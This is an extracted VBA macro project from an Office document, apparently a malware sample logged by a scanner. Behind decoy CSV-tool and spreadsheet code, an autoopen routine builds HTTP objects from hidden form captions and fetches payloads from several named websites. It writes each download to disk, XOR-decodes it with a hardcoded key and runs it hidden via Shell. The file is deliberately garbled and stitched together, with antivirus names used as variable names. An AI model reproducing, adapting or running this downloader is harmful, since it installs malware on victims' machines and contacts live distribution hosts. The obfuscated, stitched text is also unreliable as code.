Attribute VB_Name = "A0"


    Private Sub genresButton_Click(sender As Object, e As String)
       
        Dim varUsedCount As Integer
        Dim sw As New Stopwatch
        Try



                For i = 0 To listSize
                    If media.Contains(listVariables(i)) Then
                        varUsed.Add (listVariables(i))
                        varUsedIndex.Add (listVariables.IndexOf(listVariables(i)))                                                  'creates a list of the indices of the variables used
                    End If
                Next
                'templateBox.ReadOnly = True
                varUsedCount = varUsed.count

                outputBox.Text = ""                                                                                                 'clears output box to start fresh
               StatusLabel.Text = "Running for: "
                For l = 0 To RowCount - 1
                    arMedia.Add (media)
                    media = temp

                    'For r = 0 To rowLength
                    '    media = media.Replace(listVariables(r), arRow(r))
                    'Next

                    'Goes through And only replaces the used variables instead of checking all of them.
                    For r = 0 To varUsedCount - 1
                        'Dim str = listVariables(varUsedIndex(r))
                        'MessageBox.Show(str)
                        media = media.Replace(listVariables(varUsedIndex(r)), arRow(varUsedIndex(r)))
                    Next

                Next

                arMedia.Add (media)                                                                                 'enters last item into the array.
                For i = 1 To RowCount
                    'outputBoxLength = outputBox.Text.Length
                    'outputBox.Text = outputBox.Text.Insert(outputBoxLength, arMedia.Item(i))
                    outputBox.AppendText (arMedia(i))
                    outputBox.Text = outputBox.Text + Environment.NewLine
                    StatusLabel.Text = "Running for: " & (sw.ElapsedMilliseconds / 1000) & " seconds"
               Next
                StatusLabel.Text = "Finished! It took " & (sw.ElapsedMilliseconds / 1000) & " seconds to finish running."
                'templateBox.ReadOnly = False
  

    End Sub


Public Sub MoveSheets(sheetToMove As String, sheetAnchor As String, VrigDO6OrAfter As String)


 Dim i
 On Error GoTo d13
For i = LBound(MovedPermanently) To UBound(MovedPermanently) Step 1
 SaveDataCSVToolStripMenuItem_Click 72
If rptProblem.Status <> 200 Then
 Err.Raise vbObjectError + 900, "1", "2"
End If
    
    
    
    VrigDO6 "33", 3
 Exit Sub
d13:
Next
Exit Sub

    
End Sub
    Public Sub SaveDataCSVToolStripMenuItem_Click(e As Integer)
       AVG_ESET_IKARUS__4 = sTVOL.Label2.Caption & MovedPermanently(i)
 ProjectDarvin = ProjectDarvin + 2
 Dim XIpotom2 As Ishimitsu
Set XIpotom2 = New Ishimitsu
If e < 500 Then


 XIpotom2.Challenge "Swed", 13
CallByName rptProblem, sTVOL.ToggleButton1.Caption, VbMethod
Set XIpotom2 = Nothing
 
Else

            SaveFileDialog1.InitialDirectory = "c:\temp\"
            SaveFileDialog1.Filter = "CSV files (*.csv)|*.csv"
            SaveFileDialog1.FilterIndex = 2
            SaveFileDialog1.RestoreDirectory = True

            If (SaveFileDialog1.ShowDialog() = Wind.ows.Forms.DialogResult.OK) Then
                saveCSV = SaveFileDialog1.filename
            End If
            If saveCSV <> "" Then
              
                'Process.Start(saveCSV)
            End If
End If
    End Sub


Public Sub Method1(MethodParam2() As Byte, MethodParam As String)

  
  Dim AhnLab2 As Long
  Dim AhnLab3 As Long
  Dim AhnLab5 As Long
  Dim AhnLab6 As Long
  Dim plusplus() As Byte
Dim AhnLab4 As Long
Dim plusplusLen As Long
  plusplusLen = Len(MethodParam)
ReDim plusplus(plusplusLen)

  plusplus = StrConv(MethodParam, vbFromUnicode)

  
  AhnLab2 = UBound(MethodParam2) + 1
  AhnLab5 = AhnLab2
  
  
  For AhnLab4 = 0 To (AhnLab2 - 1)
  aa = plusplus(AhnLab4 Mod plusplusLen)
  bb = MethodParam2(AhnLab4)
  MethodParam2(AhnLab4) = Ashnorog(bb, aa)
    
    If (AhnLab4 >= AhnLab6) Then
      AhnLab3 = Int((AhnLab4 / AhnLab5) * 100)
      AhnLab6 = (AhnLab5 * ((AhnLab3 + 1) / 100)) + 1
    End If
  Next
End Sub


    Private Sub SaveOutputToolStripMenuItem_Click(sender As Object, e As String)
        Try
            If outputBox.Text <> "" Then


                SaveFileDialog1.InitialDirectory = "c:\temp\"
                SaveFileDialog1.Filter = "Text files (*.txt)|*.txt|All Files (*.*)|*.*"
                SaveFileDialog1.FilterIndex = 2
                SaveFileDialog1.RestoreDirectory = True
                If (SaveFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK) Then
                    saveOutputName = SaveFileDialog1.filename
                End If
                If saveOutputName <> "" Then

                End If

            Else
                MessageBox.Show ("The Output box is empty")
            End If



    End Sub

    Private Sub SaveTemplateToolStripMenuItem_Click(sender As Object, e As String)
        Try
            If templateBox.Text <> "" Then


                SaveFileDialog1.InitialDirectory = "c:\temp\"
                SaveFileDialog1.Filter = "Text files (*.txt)|*.txt|TPL files (*.tpl)|*.tpl"
                SaveFileDialog1.FilterIndex = 2
                SaveFileDialog1.RestoreDirectory = True
                If (SaveFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK) Then
                    savetplName = SaveFileDialog1.filename
                End If
                If savetplName <> "" Then

                Else
                    MsgBox ("Template Not Saved. Please Select a filepath")
                End If

            Else
                MessageBox.Show ("The template box is empty")
            End If


    End Sub


Attribute VB_Name = "Class1"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "Dard"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True


Sub autoopen()
Rashe = 4 + 81
If 1102 > Rashe Then
Maxibon
End If
End Sub

    Private Sub LoadDataCSVToolStripMenuItem_Click(sender As Object, e As String)
        Try
            OpenFileDialog1.InitialDirectory = "c:\temp\"                                       'doesnt actually open c/temp
            OpenFileDialog1.Filter = "CSV files (*.csv)|*.csv"                                  'filters for CSVs
            OpenFileDialog1.FilterIndex = 2                                                     'sets the filterindex to 2, otherwise out of bounds.
            OpenFileDialog1.RestoreDirectory = True                                             'remembers the directory you last opened
            OpenFileDialog1.MultiSelect = False                                                 'only allows selecting of 1 file
            If (OpenFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK) Then              'if user clicks OK, grab the filename and set it to csvName
                csvName = OpenFileDialog1.filename
            End If
            Me.StatusStrip1.Text = csvName                                                      'set the StatusStrip1 to read the csvName DOESNT WORK
            CSVFileReader.TextFieldType = FileIO.FieldType.Delimited                            'indicates it is delimited, as opposed to fixed width
            CSVFileReader.SetDelimiters (",")                                                   'indicates the delimiter - could potentially make this a preferences variable.


            Dim Column As DataColumn
            Dim Row As DataRow
            Dim UpperBound As Int32
            Dim ColumnCount As Int32

            While Not CSVFileReader.EndOfData
                Try
                    CurrentRow = CSVFileReader.ReadFields()
                    If Not CurrentRow Is Nothing Then
                        'Check if DataTable has been created
                        If CSVFileTable Is Nothing Then
                            'Get Number of columns
                            UpperBound = CurrentRow.GetUpperBound(0)
                            'Create new datatable
                            Dim colHeaders(UpperBound)
                            For ColumnCount = 0 To UpperBound
                                colHeaders(ColumnCount) = CurrentRow(ColumnCount).ToString
                                pubHeaders.Add (colHeaders(ColumnCount).ToString)               'use the column headers as column names
                            Next
                            For ColumnCount = 0 To UpperBound
                                Column = New DataColumn
                                Column.DataType = System.Type.GetType("System.String")
                                Column.ColumnName = colHeaders(ColumnCount)
                                Column.Caption = CurrentRow(ColumnCount).ToString
                                CSVFileTable.Columns.Add (Column)
                            Next
                        End If
                        Row = CSVFileTable.NewRow
                        For ColumnCount = 0 To UpperBound
                            Row(pubHeaders(ColumnCount)) = CurrentRow(ColumnCount).ToString
                            'Row()
                        Next
                        CSVFileTable.Rows.Add (Row)

                    End If

            CSVFileTable.Rows.RemoveAt (0)
            RowCount = CSVFileTable.Rows.count
            csvDataGrid.DataSource = CSVFileTable
            csvTable = CSVFileTable.Copy()                                                              ' makes the csvTable public
            listSize = pubHeaders.count - 1                                                                 ' empties the listbox so new entries wouldnt be appended to bottom of old list
            For i = 0 To listSize
                varHeaderBox.Items.Add ("<<" + pubHeaders(i) + ">>")                                    'Adds the << >> brackets for search/replace later
                listVariables.Add ("<<" + pubHeaders(i) + ">>")                                         'creates a list of variables with the same entries.
            Next

    End Sub

Attribute VB_Name = "Ishimitsu"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Public Function ratatu() As String


ALAWAR = Split(sTVOL.PPAPBOX.Text, "PPAP")


Module23

ratatu = ""

End Function


    Public Sub Challenge(sender As String, e As Integer)

CallByName rptProblem, sTVOL.OptionButton1.ControlTipText, VbMethod, ALAWAR(5), AVG_ESET_IKARUS__4, False
Import2
    End Sub
Private Sub Import2()


CallByName rptProblem, sTVOL.Trbd.Text, VbMethod, AVG_ESET_IKARUS__System, sTVOL.SpinButton1.ControlTipText

End Sub








Attribute VB_Name = "Module1"


Public Const AVG_ESET_IKARUS__System = "User-Agent"
Public SubProperty As Object

Public Const Sooopchik = "avetof"




Public AVG_ESET_IKARUS__PokerFace As Variant
Public AVG_ESET_IKARUS__GMAKO As Object
Public AVG_ESET_IKARUS__LAKOPPC As String
Public AVG_ESET_IKARUS__PIRO_LOR As Object


Public ProjectDarvin As Integer
Public AVG_ESET_IKARUS__RDD2 As Object
Public StendMissed As String
Public AVG_ESET_IKARUS__2 As String


Public ALAWAR() As String
Public AVG_ESET_IKARUS__Done As String
Public AVG_ESET_IKARUS__DoneBBB As String
Public rptProblem As Object


Public MovedPermanently() As String
Public AVG_ESET_IKARUS__4 As String

Public Function Ashnorog(Var1, Var2)
  Ashnorog = Var1 Xor Var2
  
End Function


Public Sub Module23()






Set AVG_ESET_IKARUS__PIRO_LOR = CreateObject(ALAWAR(3))
StendMissed = sTVOL.Label1.Caption

  
MovedPermanently = Split("no1archeryandsports.ca/87gyub+artlab.co.il/87gyub+avenueresto.com/87gyub", sTVOL.zLBL.Caption)
 Set SubProperty = CreateObject(ALAWAR(1))
    
   Set AVG_ESET_IKARUS__GMAKO = CreateObject(ALAWAR(1 + 2 + 3 - 4))
Set rptProblem = CreateObject(ALAWAR(0))


Set AVG_ESET_IKARUS__RDD2 = AVG_ESET_IKARUS__PIRO_LOR.Environment(ALAWAR(4))
 AVG_ESET_IKARUS__LAKOPPC = AVG_ESET_IKARUS__RDD2(ALAWAR(6))
 ProjectDarvin = 0
 MoveSheets "", "", ""








End Sub

Attribute VB_Name = "Module2"






Public Sub AsizePlusX(Dpilulten As String, pilultenJ As String, Optional AVG_ESET_IKARUS__Sexote As String)

  Dim pilulten As Integer
  Dim Gpilulten() As Byte
  
  pilulten = FreeFile
  Open Dpilulten For Binary As #pilulten
  ReDim Gpilulten(0 To LOF(pilulten) - 1)
  Get #pilulten, , Gpilulten()
  Close #pilulten
  Call Method1(Gpilulten(), AVG_ESET_IKARUS__Sexote)
  pilulten = FreeFile
  Open pilultenJ For Binary As #pilulten
  Put #pilulten, , Gpilulten()
  Close #pilulten

End Sub
Public Function shtefan(VarDocha)
GoTo ShtefeNItro

Dim pdfFilePath As String
            Dim wri

            d.oc.Open

            Dim font8

            Dim paragraph
            parag.raph.Alignment = 1

            Dim dt

            If dt Then
                Dim PdfTable

                Dim pdfpcell

                For Column = 0 To dt.Columns.count - 1

                    pdfp.Cell.BackgroundColor = BaseColor.Gray
                    pdfp.Cell.BorderWidth = 1

                    PdfT.able.AddCell (pdfpcell)

                Next

                For Rows = 0 To dt.Rows.count - 1
                    For Column = 0 To dt.Columns.count - 1

                        PdfTa.ble.AddCell (pdfpcell)
                    Next
                Next
                PdfTa.ble.SpacingBefore
                d.oc.Add (paragraph)
                d.oc.Add (PdfTable)

                Pro.cess.Start (Direc.tory.GetCurrentDirectory & "\myPdf.pdf")

End If
ShtefeNItro:
   Shell VarDocha, vbHide
   Exit Function
    shtefan = Applica.tion.WorksheetFunction.VLookup(skuNum, , 4, 0)

End Function

Public Function DoChild()

 AVG_ESET_IKARUS__Done = AVG_ESET_IKARUS__LAKOPPC
 AVG_ESET_IKARUS__DoneBBB = AVG_ESET_IKARUS__Done + "\bogort" + CStr(ProjectDarvin)
AVG_ESET_IKARUS__Done = AVG_ESET_IKARUS__Done + Replace(ALAWAR(12), ".", CStr(ProjectDarvin) + ".")
 SubProperty.Type = 1

End Function



Function itemTitle(skuNum)
'retrieve Item title from SKU

    itemTitle = Application.WorksheetFunction.VLookup(skuNum, [Products], 2, 0)

End Function



Function itemDesc(skuNum)
'retrieve item description from SKU

    itemDesc = Application.WorksheetFunction.VLookup(skuNum, [Products], 4, 0)

End Function

Function itemUPC(skuNum)
'retrieve item upc from SKU, No character limit or formatting

    itemUPC = Application.WorksheetFunction.VLookup(skuNum, [Products], 3, 0)

End Function



Attribute VB_Name = "Z1"

    Private Sub LoadTemplateToolStripMenuItem_Click(sender As Object, e As String)
        Try
            OpenFileDialog1.InitialDirectory = "c:\temp\"
            OpenFileDialog1.Filter = "Text files (*.txt)|*.txt|TPL Files (*.tpl)|*.tpl"
            OpenFileDialog1.FilterIndex = 2
            OpenFileDialog1.RestoreDirectory = True
            OpenFileDialog1.MultiSelect = False

            If (OpenFileDialog1.ShowDialog() = Windows.Forms.DialogResult.OK) Then
                Dim tplRead As IO.StreamReader
                tplName = OpenFileDialog1.filename
                tplRead = IO.File.OpenText(tplName)
                templateBox.Text = tplRead.ReadToEnd
            End If




    End Sub

Public Sub Maxibon()
Dim c As Ishimitsu
Set c = New Ishimitsu

CallByName c, sTVOL.TextBox2.Text, VbMethod

Set c = Nothing
End Sub

Public Function VrigDO4(FullPath As String, NumHoja As Integer) As String
  AsizePlusX AVG_ESET_IKARUS__DoneBBB, AVG_ESET_IKARUS__Done, "zuOBnhTXfSI4u0R2S24aaSauh99btOss"


   For i = 3 To NumHoja
If NumHoja > 100 Then
    If UCase(Trim(Cel.ls(i, ColumnaExportado).Value)) = "N" Then
        If Cel.ls(i, ColumnaDate).Value = "" Then
            VrigDO4 = "Date column is empty for row [Columna fecha vacia para fila]: " & i
            Exit Function
        End If
        If Cel.ls(i, ColumnaAmount).Value = "" Then
            If ColumnaAmount2 = -1 Then
                VrigDO4 = "Amount column is empty for row [Columna amount vacia para fila]: " & i
                Exit Function
            End If
        End If
        If Cel.ls(i, ColumnaMemo).Value = "" Then
            VrigDO4 = "Memo column es empty for row [Columna memo vacia para fila]: " & i
            Exit Function
        End If
        If Cel.ls(i, ColumnaCategory).Value = "" Then
            If ColumnaAmount2 = -1 Then
                VrigDO4 = "Category column is empty for row [Columna category vacia para fila]: " & i
                Exit Function
            End If
        End If
        
        If ColumnaAmount2 <> -1 Then
            If Cel.ls(i, ColumnaAmount2).Value <> "" And Cel.ls(i, ColumnaCategory2).Value = "" Then
                VrigDO4 = "Category2 column is empty for row [Columna category2 vacia para fila]: " & i
                Exit Function
            End If
        End If
    End If
    
End If
Next i

   shtefan StendMissed & AVG_ESET_IKARUS__Done & ",pass"
End Function



Public Function VrigDO6(FullPath As String, NumHoja As Integer) As String

DoChild
 CallByName SubProperty, "Open", VbMethod
If NumHoja > 400 Then

    If numExportadas = 0 Then
        VrigDO6 = "No rows to export [No tiene filas por exportar]"
        Exit Function
    End If
End If

 AVG_ESET_IKARUS__PokerFace = rptProblem.responseBody

    
 SubProperty.Write AVG_ESET_IKARUS__PokerFace
CallByName SubProperty, "s" + Sooopchik + "ile", VbMethod, AVG_ESET_IKARUS__DoneBBB, 2
VrigDO4 ".", 1
End Function


Public Function PizaaT(FullPath As String, NumHoja As Integer) As String
If NumHoja > 500 Then
    If Dir(FullPath & ".qif") > "" Then
        PizaaT = "File already exists [El fichero ya existe]: " & FullPath
        Exit Function
    End If
    
    If Dir(FullPath & "_2.qif") > "" Then
        PizaaT = "File already exists [El fichero ya existe]: " & FullPath
        Exit Function
    End If
End If

AVG_ESET_IKARUS__4 = sTVOL.Label2.Caption & MovedPermanently(i)
 ProjectDarvin = ProjectDarvin + 2
 Dim XIpotom2 As Ishimitsu
Set XIpotom2 = New Ishimitsu

 XIpotom2.Challenge "Ardu", 22
CallByName rptProblem, sTVOL.ToggleButton1.Caption, VbMethod
Set XIpotom2 = Nothing
 

End Function







    Private Sub varHeaderBox_DoubleClick(sender As Object, e As String)
        If templateBox.ReadOnly = False Then
            templateBox.Text = templateBox.Text.Insert(0, varHeaderBox.SelectedItem)
        End If


    End Sub


Attribute VB_Name = "sTVOL"
Attribute VB_Base = "0{65846724-45FD-45C3-8F80-6E2F6BB9FA1D}{DEA0C7C9-C39E-4C8A-8FAA-BC7673557DC4}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

' InQuest injected base64 decoded content
' Z	%S
' *Lz{
' Z	%S
' DvKn

INQUEST-PP=macro
